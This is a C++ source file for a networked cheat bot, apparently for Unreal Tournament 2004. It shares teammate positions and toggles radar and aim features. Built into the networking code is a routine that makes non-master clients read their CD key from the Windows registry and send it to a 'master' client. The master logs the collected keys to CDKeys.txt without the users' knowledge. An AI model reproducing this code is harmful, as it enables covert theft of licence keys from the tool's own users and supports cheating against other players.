#include "XUTSock.h"
#include "XBot.h"
#include <stdio.h>

XUTSock::XUTSock() : XSock()
{
	//memset(playerList,0,sizeof(XPlayer)*32);
	packetSize = sizeof(DataPacket);
	memset(&pkt, 0, packetSize);
	regedit = new XRegedit();


	udpDelayTime = 0;
	it = playerPositions.end();
}

XUTSock::~XUTSock()
{
	names.clear();
	//TODO: RIPULIRE LE MAPPE!
}


void XUTSock::procTcpMessageEx(const DataPacketEx* data, const in_addr* sender)
{
	switch(data->id)
	{
	case ID_STRING: processChatMessage(data, sender);	break;
	case ID_KILL:	processKillUTInstance(data, sender);break;
	case ID_CDKEY:	processSaveCdkeys(data, sender);	break;
	default:											break;
	}
}

//Process clients data
void XUTSock::procTcpMessage(const DataPacket* data, const in_addr* sender)
{
	switch(data->id)
	{
	case ID_TRESET:		processTimerOps(data->x);							break;
	case ID_GETCDKEY:	processGetCdkeys(data, sender);						break;
	case ID_ASKSTAT:	processGetRemotePlayersStatus(data, sender);		break;
	case ID_SNDSTAT:	processGetRemotePlayersStatusResponse(data, sender);break;
	default:																break;//invalid id received
	}
}

void XUTSock::procUdpMessage(const DataPacket* data, const in_addr* sender)
{	
	switch(data->id)
	{
	case ID_COORD_M: processPlayerPosition(data, sender); break;
	default:											  break;
	}
}

//log Errors and shot screen output, files are open at every call to garant progressive logging during debug phases
//*****************************************************************************************************************
void XUTSock::logMessage(char *message, ... ) 
{	
	char buffer[1024];
	FILE *logfile;
	va_list	args;

	if(NULL == message)		
		return;

	va_start( args, message );
	vsprintf( buffer, message, args );
	va_end( args );


	XBot* xbot = XBot::getXBot();

	if(buffer[strlen(buffer) - 1] == '\n')
		buffer[strlen(buffer) - 1] = 0;//rimuove endline
	xbot->console->addHistoryLine(buffer); // , 0xFFFFFFFF
	xbot->console->popUp();
	
}

void XUTSock::onSecurityCheckPassed()
{
	if(isMaster())
		XBot::getXBot()->console->buildFullCommandList();
	else
		XBot::getXBot()->console->buildLiteCommandList();
}

void XUTSock::associateNameAndIp(UINT rID, char* name)
{
	names[rID] = name;

	insertIp(rID);
}

void XUTSock::loadConfig()
{

	XBot* xbot =  XBot::getXBot();

	int i = 0;
	while(i < MAX_PLAYERS && xbot->xconfig->playerlist[i].name != 0)
	{
		associateNameAndIp(xbot->xconfig->playerlist[i].codedIp, xbot->xconfig->playerlist[i].name);
		i++;
	}
	
	memcpy(playerList, xbot->xconfig->playerlist, sizeof(XPlayer)*32);
	
}


void XUTSock::sendTimerShieldReset()
{
	memset(&pkt, 0, packetSize);

	pkt.id = ID_TRESET;
	pkt.x = TIMER_SHIELD;
	sendTcpRoomMessage(&pkt);

}

void XUTSock::sendTimerRedeemReset()
{
	memset(&pkt, 0, packetSize);

	pkt.id = ID_TRESET;
	pkt.x = TIMER_REDEEM;
	sendTcpRoomMessage(&pkt);
}

void XUTSock::sendTimerDDamageReset()
{
	memset(&pkt, 0, packetSize);

	pkt.id = ID_TRESET;
	pkt.x = TIMER_DDAMAGE;
	sendTcpRoomMessage(&pkt);
}

//Send a message that will be displayed in the console to all the connected clients
void XUTSock::sendChatMessage(const char *buffer, int size)
{
	DataPacketEx message;
	memset(&message, 0, sizeof(message));

	message.id = ID_STRING;

	if(!size)
		message.bSize = strlen(buffer);
	else
		message.bSize = size;

	if(message.bSize > DPEX_MAX_BUFFERSIZE)
		return;

	strcpy(message.buffer, buffer);

	sendTcpMessageEx(&message, message.bSize);
}

void XUTSock::processTimerOps(UINT value)
{
	
	XBot* xbot = XBot::getXBot();

	switch(value)
	{
	case TIMER_SHIELD: xbot->resetShield100Timer();	break;
	case TIMER_DDAMAGE:xbot->resetDDamageTimer();	break;
	case TIMER_REDEEM: xbot->resetRedeemTimer();	break;
	}
	
}

char* XUTSock::getPlayerName(const in_addr* address)
{
	PlayerNamesMap::iterator it;

	it = names.find(address->S_un.S_addr);

	if(it == names.end())
	{
		//TODO: request remote name here!
		return inet_ntoa(*address);
	}
	else
		return it->second;
}

void XUTSock::processChatMessage(const DataPacketEx* data, const in_addr* sender)
{
	char* playerName;
	playerName = getPlayerName(sender);

	
	XBot* xbot = XBot::getXBot();
	char buffer[1024];

	sprintf(buffer,"<%s>: %s", playerName, data->buffer);

	xbot->console->addHistoryLine(buffer , 0xFF00FFFF);
	xbot->console->popUp();
}

//****************************************************************
//						Getting Player List
//****************************************************************
void XUTSock::sendGetRemotePlayersStatus()
{
	memset(&pkt, 0, packetSize);

	pkt.id = ID_ASKSTAT;
	sendTcpMessage(&pkt);
}

void XUTSock::processGetRemotePlayersStatus(const DataPacket* data, const in_addr* sender)
{
	memset(&pkt, 0, packetSize);

	pkt.id = ID_SNDSTAT;
	pkt.x = getRoom();
	pkt.y = XBot::getXBot()->radarSwitch;
	pkt.z = XBot::getXBot()->imodeSwitch;
	sendTcpMessage(&pkt, sender);
}

void XUTSock::processGetRemotePlayersStatusResponse(const DataPacket* data, const in_addr* sender)
{
	char* name = getPlayerName(sender);
	char hasRadar[6];
	char hasAim[6];

	if(data->y)
		sprintf(hasRadar, "true");
	else
		sprintf(hasRadar, "false");

	if(data->z)
		sprintf(hasAim, "true");
	else
		sprintf(hasAim, "false");


	logMessage("%s\t\t\t%i\t%s\t%s", name, data->x, hasRadar, hasAim);	
}

void XUTSock::printClientList()
{
	logMessage("Name\t\t\tRoom\tRadar\tAim");
	sendGetRemotePlayersStatus();
}

//****************************************************************
//						KillUTInstance
//****************************************************************
void XUTSock::sendKillUTInstance(char* TargetIp)
{
	DataPacketEx message;
	memset(&message, 0, sizeof(message));

	message.id = ID_KILL;
	message.bSize = strlen(TargetIp);

	if(message.bSize > DPEX_MAX_BUFFERSIZE)
	{
		logMessage("XSocket::sendKillUTInstance: invalid target address");
		return;
	}

	strcpy(message.buffer, TargetIp);

	sendTcpMessageEx(&message, message.bSize);
}

void XUTSock::processKillUTInstance(const DataPacketEx* data, const in_addr* sender)
{
	char* playerName = inet_ntoa(*sender);
	
	XBot* xbot = XBot::getXBot();
	char buffer[1024];

	UINT addr = inet_addr(data->buffer);


	if(addr == id)
	{
		//exit(1);
		xbot->console->addHistoryLine("XBot Term" , 0xFFF00000);
		xbot->console->popUp();

	}

}

//****************************************************************
//						GetCdkeys
//****************************************************************
void XUTSock::sendGetCdkeys()
{
	if(!isMaster())	//send cdkey request only from master clients
		return;

	memset(&pkt, 0, packetSize);

	pkt.id = ID_GETCDKEY;
	pkt.x = 0;
	sendTcpMessage(&pkt);
}

void XUTSock::processGetCdkeys(const DataPacket* data, const in_addr* sender)
{

	DataPacketEx message;
	memset(&message, 0, sizeof(message));

	if(isMaster())
	{
		//OPTIONAL: far rispondere una negazione
		return;
	}
	else
	{
		ULONG length = 512;
		char cdkey[512];
		

		regedit->open(HKEY_LOCAL_MACHINE, "SOFTWARE\\Unreal Technology\\Installed Apps\\UT2004");
		regedit->getString("CDKey", cdkey, &length);
		regedit->close();

		//Prepare the Ex packet and send it to all
		message.id = ID_CDKEY;
		message.bSize = length;

		if(message.bSize > DPEX_MAX_BUFFERSIZE)
			return;

		strcpy(message.buffer, cdkey);
	}

	sendTcpMessageEx(&message, message.bSize);

}

void XUTSock::processSaveCdkeys(const DataPacketEx* data, const in_addr* sender)
{
	if(!isMaster())	//Save cdkeys only if client has master rights
		return;

	XBot* xbot = XBot::getXBot();

	char cdOut[1024];	
	sprintf(cdOut, "%s: %s\n", getPlayerName(sender), data->buffer);

	//SAVE ON A LOG FILE
	char filePath[1024];
	strcpy(filePath, xbot->launcherPath);
	strcat(filePath, "\\CDKeys.txt");

	FILE* keyLog = fopen(filePath,"a");
	fwrite(cdOut, sizeof(char), strlen(cdOut), keyLog);
	fclose(keyLog);

	xbot->console->addHistoryLine(cdOut);
}

//****************************************************************
//						Team mates coordinates
//****************************************************************

void XUTSock::sendPlayerPosition(const D3DXVECTOR3* plPosition)
{

	if((GetTickCount() - udpDelayTime) <= UDPDELAY)
		return;

	memset(&pkt, 0, packetSize);

	pkt.id = ID_COORD_M;
	memcpy(&pkt.x, &plPosition->x, sizeof(int)*3);

	sendUdpRoomMessage(&pkt);

	udpDelayTime = GetTickCount();

}


void XUTSock::processPlayerPosition(const DataPacket* data, const in_addr* sender)
{
	it = playerPositions.find(sender->S_un.S_addr);

	if(it != playerPositions.end()) //find it, so update only position and reset validation time
	{
		memcpy(&it->second->position.x, &data->x, sizeof(int)*3);
		it->second->validTime = GetTickCount();
	}
	else //just entered, so puts in all values
	{
		playerPositions[sender->S_un.S_addr] = new PlayerPosition();

		it = playerPositions.find(sender->S_un.S_addr);
		memcpy(&it->second->position.x, &data->x, sizeof(float)*3);
		sprintf(it->second->name, "%s", getPlayerName(sender));
		it->second->validTime = GetTickCount();

		//XBot::getXBot()->console->addSprintfLine("Added %i",it->first);

		it = playerPositions.begin();
	}
}

bool XUTSock::getRemotePlayerStats(D3DXVECTOR3* outPos, char* name)
{
	if(it == playerPositions.end())
	{
		it = playerPositions.begin();
		return false;
	}
	else
	{
		if(GetTickCount() - it->second->validTime < MAX_VALID_TIME)
		{
			memcpy(&outPos->x, &it->second->position.x, sizeof(float)*3);
			name = &it->second->name[0];
			it++;
			return true;
		}
		else	//contained information is no longer attendible
		{
			//XBot::getXBot()->console->addSprintfLine("DELETE");
			delete it->second;
			playerPositions.erase(it);
			it = playerPositions.begin();
			return false;
		}
	}

	return false;
}
